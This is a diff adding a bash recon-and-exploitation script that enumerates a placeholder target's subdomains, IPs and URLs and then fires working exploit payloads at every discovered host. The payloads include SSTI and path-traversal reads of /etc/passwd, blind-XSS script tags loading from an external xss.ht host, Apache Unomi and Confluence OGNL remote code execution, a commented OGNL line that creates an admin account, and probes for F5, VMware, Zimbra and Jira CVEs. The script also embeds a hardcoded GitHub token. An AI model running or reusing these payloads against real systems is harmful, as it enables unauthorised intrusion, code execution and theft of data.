@@ -1,0 +1,206 @@
+_blocker_
+mkdir -p _target_/subdomain
+subfinder -d _target_ -silent -all -o _target_/subdomain/subfinder.txt
+findomain -t _target_ | tee _target_/subdomain/
+assetfinder -subs-only _target_ | tee _target_/subdomain/assetfinder.txt
+sublist3r -d _target_ -o _target_/subdomain/sublister.txt
+amass enum -passive -norecursive -noalts -d _target_ -o _target_/subdomain/amass.txt
+python3 ~/ReconTool/censys-subdomain-finder/censys-subdomain-finder.py _target_ -o _target_/subdomain/censys-subdomain.txt
+github-subdomains -d _target_ -t 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 -o _target_/subdomain/github-domain.txt
+curl -sk "https://crt.sh/?q=_target_&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee _target_/subdomain/crt-sh.txt
+python3 /root/ReconTool/knock/knockpy.py _target_ --no-http-code 404 500 530 403 401 502 503 -o _target_/subdomain/
+_blocker_
+
+_blocker_
+cat _target_/subdomain/*.json | grep "_target_" | cut -d ":" -f2 | cut -d "{" -f2 | cut -d "\"" -f2 | sort -u | tee _target_/subdomain/knock-subdomains.txt
+_blocker_
+
+_blocker_
+cat _target_/subdomain/*.txt | uniq -u | tee _target_/subdomain/subdomains.txt
+_blocker_
+
+_blocker_
+cat _target_/subdomain/subdomains.txt | httpx -silent | sort -u | tee _target_/subdomain/hosts.txt
+_blocker_
+#dnsrecon Zone Transfer
+mkdir -p _target_/DNS-Enum/
+_blocker_
+dnsrecon -a -d _target_ | tee _target_/DNS-Enum/dnsrecon.txt
+fierce --domain _target_ | tee _target_/DNS-Enum/fierce.txt
+dnsenum _target_ -o _target_/DNS-Enum/dnsenum.txt
+_blocker_
+
+cat _target_/subdomain/hosts.txt | httpx -silent | aquatone -ports 80 443 8000 8080 8443 -out _target_/subdomain/aquaton
+
+# Test:Subdomain-Takeover
+_blocker_
+cat _target_/subdomain/hosts.txt | nuclei -t ~/nuclei-templates/takeovers -o _target_/subdomain-takeover.out
+subzy -targets _target_/subdomain/hosts.txt --hide_fails --concurrency 100 | tee _target_/subdomain-takeover2.txt
+cat _target_/subdomain/hosts.txt | nuclei -t ~/nuclei-templates/dns/azure-takeover-detection.yaml -o _target_/azure-takveover.txt
+_blocker_
+
+
+mkdir -p _target_/IPs/
+_blocker_
+cat _target_/subdomain/hosts.txt | dnsx -a -resp-only -o _target_/IPs/IP-A-Record.txt
+cat _target_/subdomain/*.json | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | tee _target_/IPs/knock-ips.txt
+censys search _target_ | grep "ip" | egrep -v "description" | egrep -v "city" | cut -d ":" -f2 | tr -d \"\ | sed 's/,//g' | tee _target_/IPs/censys-ip.txt
+cat _target_/IPs/*.txt | sort -u | tee _target_/IPs/ips.txt
+cat _target_/subdomain/subdomains.txt | dnsx -a -resp-only | nrich - | tee _target_/IPs/nrich.out
+naabu -l _target_/subdomain/subdomains.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -top-ports 1000 -silent -o _target_/IPs/subdomain-port.txt
+traceroute _target_ | anew _target_/IPs/trace-ips.txt
+shodan search Ssl.cert.subject.CN:"_target_" 200 --fields ip_str | httpx -silent | tee _target_/IPs/shodan-ip.txt
+cat _target_/subdomain/subdomains.txt | naabu -sa -silent -nc -tp 80 -p 8080 8443 8090 9000 9001 9002 9003 | aquatone -out _target_/IPs/aquatone_screenshots
+masscan -p1–65535 -iL IPs/ips.txt --max-rate 10000 -oG _target_/IPs/masscan.txt
+rustscan -a _target_/IPs/ips.txt -r 1-65535 -o _target_/IPs/rusts_result.txt
+#nmap --script default,safe,discovery -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8880,3000 -n -T4 -iL IPs/ips.txt -oN nmap.out
+curl -s "https://rapiddns.io/subdomain/_target_?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | cut -d '/' -f3  | sed 's/?t=cname//g' | sed 's/#result//g' | sed 's/\.$//' | sort -u | tee _target_/Rapid-Dns.txt
+_blocker_
+
+echo "[+] Done IPs Enumeration"
+
+mkdir -p _target_/URLs
+_blocker_
+echo "Start: Wayback URLs collecting"
+cat _target_/subdomain/hosts.txt | waybackurls | sort -u | uro | httpx -silent | tee _target_/URLs/waybackurls.txt
+cat _target_/subdomain/hosts.txt | gauplus | sort -u | uro | httpx -silent | tee _target_/URLs/Gauplus.txt
+python3 ~/ReconTool/waybackMachine/waybackMachine.py _target_ | sort -u | uro | tee _target_/URLs/WaybaclMachine.txt
+katana -list _target_/subdomain/hosts.txt -o _target_/URLs/katana-urls.txt
+_blocker_
+cat _target_/URLs/*.txt | sort -u | uro | tee _target_/URLs/urls.txt
+_blocker_
+python3 ~/ReconTool/ParamSpider/paramspider.py -d _target_ --exclude woff,.css,.js,.png,.svg,.php,.jpg -o _target_/URLs/
+cat _target_/URLs/urls.txt | cut -d "/" -f 4,5 | sed 's/?.*//' | sort -u | tee _target_/wordlist.txt
+_blocker_
+echo "[+] Done Crawlling: Wayback + Gauplus + ParamSpider "
+
+
+mkdir -p _target_/GF-Pattern/
+_blocker_
+cat _target_/URLs/urls.txt | grep "=http" | sort -u | tee _target_/GF-Pattern/redirect.txt
+cat _target_/URLs/urls.txt | gf xss | sort -u | tee _target_/GF-Pattern/xss.txt
+cat _target_/URLs/urls.txt | gf sqli | sort -u | tee _target_/GF-Pattern/sqli.txt
+cat _target_/URLs/urls.txt | gf ssrf | sort -u | tee _target_/GF-Pattern/ssrf.txt
+cat _target_/URLs/urls.txt | gf lfi | sort -u | tee _target_/GF-Pattern/lfi.txt
+cat _target_/URLs/urls.txt | gf idor | sort -u | tee _target_/GF-Pattern/idor.txt
+cat _target_/URLs/urls.txt | gf rce | sort -u | tee _target_/GF-Pattern/rce.txt
+cat _target_/URLs/urls.txt | gf ssti | sort -u | tee _target_/GF-Pattern/ssti.txt
+cat _target_/GF-Pattern/ssti.txt |  qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x" | tee _target_/ssti-result.txt
+_blocker_
+
+
+mkdir -p _target_/JS-FILE
+_blocker_
+cat _target_/URLs/urls.txt | grep '\.js$' | httpx -status-code -mc 200 -silent | grep 'application/javascript' | tee _target_/JS-FILE/jsfile1.txt
+cat _target_/URLs/urls.tx | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | grep ".*\.js" | tee _target_/JS-FILE/jsfile2.txt
+#subfinder -d _target_ -silent | waybackurls | grep ".js$" | tee _target_/JS-FILE/jsfile3.txt
+cat _target_/subdomain/hosts.txt | subjs | tee _target_/JS-FILE/jsfile3.txt
+_blocker_
+
+_blocker_
+cat _target_/JS-FILE/*.txt | sort -u | tee _target_/JS-FILE/final-js.txt
+cat _target_/JS-FILE/final-js.txt | xargs -I% bash -c 'curl -sk "%" | grep -w "*.s3.amazonaws.com"' | tee -a _target_/JS-FILE/s3_bucket.txt
+cat _target_/JS-FILE/final-js.txt| xargs -I% bash -c 'curl -sk "%" | grep -w "*.s3.us-east-2.amazonaws.com"' | tee -a _target_/JS-FILE/s3_bucket.txt
+cat _target_/JS-FILE/final-js.txt | xargs -I% bash -c 'curl -sk "%" | grep -w "s3.amazonaws.com/*"' | tee -a _target_/JS-FILE/s3_bucket.txt
+cat _target_/JS-FILE/final-js.txt |  xargs -I% bash -c 'curl -sk "%" | grep -w "s3.us-east-2.amazonaws.com/*"' | tee -a _target_/JS-FILE/s3_bucket.txt
+#we have all the s3 aws bucket url then we will collect the _target_/JS-FILE/s3 buck name
+cat _target_/JS-FILE/s3_bucket.txt | sed 's/s3.amazonaws.com//' | tee -a _target_/JS-FILE/bucket_name.txt
+cat _target_/JS-FILE/s3_bucket.txt | sed 's/s3.us-east-2.amazonaws.com//' | tee -a _target_/JS-FILE/bucket_name.txt
+
+_blocker_
+
+sleep 5
+
+mkdir -p _target_/Technologies
+_blocker_
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'Moment.js' -o _target_/Technologies/Moment.txt
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'wordpress' -o _target_/Technologies/wordpress.txt
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'Elementor' -o _target_/Technologies/Elementor.txt
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'grafana' -o _target_/Technologies/grafana.txt
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'confluence' -o _target_/Technologies/confluence.txt
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'jira' -o _target_/Technologies/jira.txt
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'zimbra' -o _target_/Technologies/zimbra.txt
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'VMware' -o _target_/Technologies/VMware.txt
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'Elasticsearch' -o _target_/Technologies/Elasticsearch.txt
+httpx -l _target_/subdomain/hosts.txt -threads 100 -match-string 'springcloud' -o _target_/Technologies/springcloud.txt
+_blocker_
+
+echo "[+] Done Technologies Detect"
+
+mkdir -p _target_/Nuclie
+_blocker_
+nuclei -l _target_/subdomain/hosts.txt -tags lfi,xss,ssrf,wordpress,rce,cve -c 500 --bulk-size 500 -rl 100 -t ~/nuclei-templates/ -o _target_/Nuclie/nuclei-scan.txt
+# cat _target_/subdomain/hosts.txt | nuclei -t ~/nuclei-templates -severity critical,high,medium,low -c 500 --bulk-size 500 -rl 100 -o _target_/Nuclie/nuclei.out
+-t ~/nuclei-templates/ --severity critical high medium low -silent -o Nuclie/nuclei.txt
+rustscan -a _target_/IPs/ips.txt -r 1-65535 | grep Open | tee _target_/Nuclie/open-ports.txt | sed 's/Open//g' | httpx -silent | nuclei -t ~/nuclei-templates -o _target_/Nuclie/rustscan-result.out
+
+_blocker_
+sleep 5
+echo "[+] Done Nuclie Scan "
+
+
+mkdir -p _target_/Vulnerability
+_blocker_
+cat _target_/GF-Pattern/lfi.txt | sed 's/=.*/=/' | nuclei -t ~/FindBug/LFI_FUZZ.yaml -o _target_/Vulnerability/LFI-FUZZ.txt
+
+_blocker_
+# Blind-XSS
+_blocker_
+ffuf -c -w _target_/URLs/urls.txt -u FUZZ -H "User-Agent: \"><script src=https://abdulrahman2x.xss.ht></script>" -o _target_/blind-xss-fuzz.txt
+cat _target_/URLs/urls.txt | grep "&" | sort -u | bxss -appendMode -payload '"><script src=https://abdulrahman2x.xss.ht></script>' -parameters
+cat _target_/URLs/urls.txt | bxss -payload '"><script src=https://abdulrahman2x.xss.ht></script>' -header "X-Forwarded-For"
+_blocker_
+
+
+ffuf -c -w _target_/subdomain/hosts.txt -u FUZZ -H "Origin: https://evil.com" -mr ".*evil\.com*" -o _target_/origin.txt
+
+
+_blocker_
+crlfuzz -l _target_/subdomain/hosts.txt -o _target_/Vulnerability/crlf.txt
+cat _target_/subdomain/hosts.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80 443 8080 8443 -mr "uid=" -silent -o _target_/Vulnerability/os-injection.out
+httpx _target_/subdomain/hosts.txt -path "/_fragment?_path=_controller=phpcredits&flag=-1" -threads 100 -random-agent -x GET  -tech-detect -status-code  -follow-redirects -title -mc 200 -match-regex "PHP Credits" -o _target_/Vulnerability/RCE.out
+cat _target_/subdomain/hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200 -o _target_/Vulnerability/attlassian.txt
+cat _target_/subdomain/hosts.txt | httpx -path "s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties" -mc 200 -o _target_/Jira-CVE-2021-26086.txt
+cat _target_/IPs/shodan-ip.txt | httpx -path "s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties" -mc 200 -o _target_/Jira-CVE-2021-26086-2.txt
+cat _target_/subdomain/hosts.txt | httpx -title -path "/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd" -match-string "root:x:0:0" -o _target_/Vulnerability/CVE-2022-31474.txt
+cat _target_/subdomain/hosts.txt | httpx -cl -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443  | anew _target_/Vulnerability/myP1s.txt
+nuclei -l _target_/subdomain/hosts.txt -tags aem -t ~/nuclei-templates -vv -o _target_/aem.out
+_blocker_
+
+_blocker_
+# Unomi-RCE
+cat _target_/subdomain/hosts.txt | while read host do;do  curl --insecure --silent -X POST http://$host/context.json --header 'Content-type: application/json' --data '{"filters":[{"id":"boom ","filters":[{"condition":{"parameterValues":{"propertyName":"prop","comparisonOperator":"equals","propertyValue":"script::Runtime r=Runtime.getRuntime();r.exec('id');"},"type":"profilePropertyCondition"}}]}],"sessionId":"boom"}' | grep -qs "boom" && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done | egrep -v "Not" | tee _target_/Vulnerability/Unomi-RCE.txt
+cat _target_/subdomain/hosts.txt | httpx -path "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" -mc 302 -o Vulnerability/ONGL-injection.txt #https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134
+cat subdomain/hosts.txt | httpx -follow-redirects -title -path "/repos?visibility=public" -match-string "repository-container" -threads 9500 -o _target_/Vulnerability/CVE-2022-36804.txt # @shaybt12
+# cat subdomain/hosts.txt | httpx -path "/${#this.getUserAccessor().addUser('abdulx01','password@123','abdul@rahman.com','Abdul',@com.attlassian.confluence.util.GeneralUnit@splitCommaDelimitedString("confluence-administrators,confluence-users"))}/" -mc 302 -o _target_/Vulnerability/ONGL-injection2.txt
+_blocker_
+
+_blocker_
+cat _target_/subdomain/hosts.txt | httpx -nc -silent -t 80 -p 80,443,8443,8080,8088,8888,9000,9001,9002,9003 -path "/app_dev.php/1'%20%22" -mr "An exception occurred" -o _target_/Vulnerability/symfony-sqli-error.txt
+cat _target_/subdomain/hosts.txt | httpx -ports 80,443,8080,8443,8090 -path /web-console/ -status-code -title -nc -t 250 -mc 200 -o _target_/Vulnerability/webconsole.txt
+cat _target_/subdomain/hosts.txt |  httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd"  -mr "root:x" -silent -o _target_/Vulnerability/Apache-Flink-lfi.txt
+cat _target_/subdomain/hosts.txt | httpx -nc -silent -p 80,443,8080,8443,8088,9000,9001,9002,9003 -path "/../../../../../../../../etc/random/../password" -mr "root:x" | tee _target_/Vulnerability/lfi3.txt
+cat _target_/subdomain/hosts.txt | httpx -t 60 -nc -p 80,443,8080,8443,9001,9002,9002,9003 -H "Cookie:usid=../../../../../../../../../../../../etc/passwd" -mc 200 -mr "root:x:" -o _target_/Vulnerability/lfi-on-cookie.txt
+cat _target_/subdomain/hosts.txt | httpx -p 80,443,8080,8443,9001,9002,9003,9000 -path "/asset////////////////../../../../../../../../etc/passwd" -mr "root:x" -nc -t 50 -o _target_/Vulnerability/LFI.txt
+cat _target_/subdomain/hosts.txt | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8808 -path "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd" -mr "root:x:" -t 60 | tee _target_/Vulnerability/lfi2.txt
+cat _target_/subdomain/hosts.txt | httpx -path "/zimbraAdmin/cmd.jsp?cmd=ls" -match-string "Command: ls" -o _target_/Vulnerability/Zimbra-CVE-2022-27925.txt
+_blocker_
+
+_blocker_
+cat _target_/subdomain/hosts.txt | httpx -title -path "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" -match-string "gid=" -o _target_/Vulnerability/CVE-2022-26134.txt #shayb112
+cat _target_/subdomain/hosts.txt | httpx  -follow-redirects -title -path "/secure/WBSGanttManageScheduleJobAction.jspa" -match-string "WBS Gantt-Chart" -threads 9500 -o _target_/Vulnerability/Attlassian-CVE-2022-0540.txt
+cat _target_/IPs/shodan-ip.txt | httpx -match-string "resterrorresponse" -threads 9500 -paths "/mgmt/shared/authn/login" -follow-redirects -o Vulnerability/CVE-2022-1388.txt
+cat _target_/subdomain/hosts.txt | httpx -follow-redirects -title -path "/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd" -match-string "root:x:0:0" -o _target_/Vulnerability/VMware-vCenter.txt #@shaybt12
+cat _target_/subdomain/hosts.txt | httpx -follow-redirects -title -path "/api/geojson?url=file:///etc/passwd" -match-string "root:x:0:0" -o _target_/Vulnerability/CVE-2021-41277.txt
+cat _target_/Nuclie/open-ports.txt | httpx -follow-redirects -title -path "/api/geojson?url=file:///etc/passwd" -match-string "root:x:0:0" -o _target_/Vulnerability/CVE-2021-41277.txt
+cat _target_/IPs/shodan-ip.txt | httpx -follow-redirects -title -path "/api/geojson?url=file:///etc/passwd" -match-string "root:x:0:0" -o _target_/Vulnerability/CVE-2021-41277.txt
+_blocker_
+
+_blocker_
+#CVE-2020-5902
+cat _target_/subdomain/hosts.txt | while read h do ;do curl -s --path-as-is -k "https://$h/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$h \033[0;31mVuln\n" || printf "$h \033[0;32mNot Vuln\n";done | egrep -v 'Not' | tee _target_/CVE-2020-5902.txt
+python3 ~/ReconTool/SQLiDetector/sqlidetector.py -f _target_/GF-Pattern/sqli.txt -w 50 -o _target_/sqli-ouput.txt
+#cat GF-Pattern/sqli.txt | sed 's/=.*/=/' | nuclei -t ~/FindBug/sqli.yaml -o _target_/sqli-detect.out
+_blocker_
+sleep 5
+echo "[+] Done Recon :) Happy Hacking"
